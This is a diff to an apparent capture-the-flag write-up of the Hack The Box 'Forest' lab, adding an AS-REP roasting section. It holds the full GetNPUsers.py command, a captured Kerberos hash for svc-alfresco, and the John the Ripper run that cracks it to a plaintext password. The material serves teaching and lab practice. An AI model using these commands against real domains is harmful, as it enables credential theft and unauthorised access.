@@ -215,7 +215,7 @@ SMB         10.10.10.161    445    FOREST           [-] htb.local\RandomFakeUser
 
 <br />
 
-Trying to use a null session also fails.
+Null session login also fails.
 
 <br />
 
@@ -316,3 +316,61 @@ group:[test] rid:[0x13ed]
 
 # AS-REP Roasting Attack:
 
+<br />
+
+There is a well-knwon vulnerability called `AS-REP Roasting Attack` that can allow us to get a user kerberos hash and brute force it to get a valid credential.
+
+However, to perform this attack, the user must have the attribute `UserAccountControl` with the flag `"DONT_REQUIRE_PREAUTH"` set.
+
+To try this attack, we only need a list of users, and if we remember, we have a valid one earned with `rpclient`:
+
+<br />
+
+```bash
+Administrator
+sebastien
+lucinda
+svc-alfresco
+andy
+mark
+santi
+```
+
+<br />
+
+To check if a user meets this condition, we will run `GetNPUsers.py` passing this list:
+
+<br />
+
+```bash
+❯ GetNPUsers.py htb.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.161
+Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra
+
+[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:faad32a1b15a8b2560541e965d16592f$cbbd81cde7f55b546981c92f0e046d45d12396cc9653783f5daee4b8205e87c1b0e310deffcb5d85f0888aa577703ce864a3fb26edbf1a2d028cfbedb06771bb80586688bcd25b998015b9c4a56d9218e16d6d28cb7e4d8994ab419c4fab4cbe59baad988d2bf3b7d71a11cdd4bc5261bfac00807b511ed64ea21789508fdafd06d6be8a81643447dbbf4235eddab81db670c9792276dc7911958cae5eb903d278d0b0ff69311f1e006f68d04d46923e3e2ac029991331a776788606bdbb8c26f90f0f700a08e0199dbcefcc7155902ccc377ca24db10e30bda680162aed397696a07bedd40e
+[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
+```
+
+<br />
+
+Now that we have obtained the `AS-REP hash` of the user `svc-alfresco`, we can attempt to crack it offline using either `Hascat` or `John the Ripper`:
+
+<br />
+
+```bash
+❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)     
+1g 0:00:00:05 DONE (2025-06-07 12:53) 0.1680g/s 686682p/s 686682c/s 686682C/s s521521..s3r3n!t
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+
+<br />
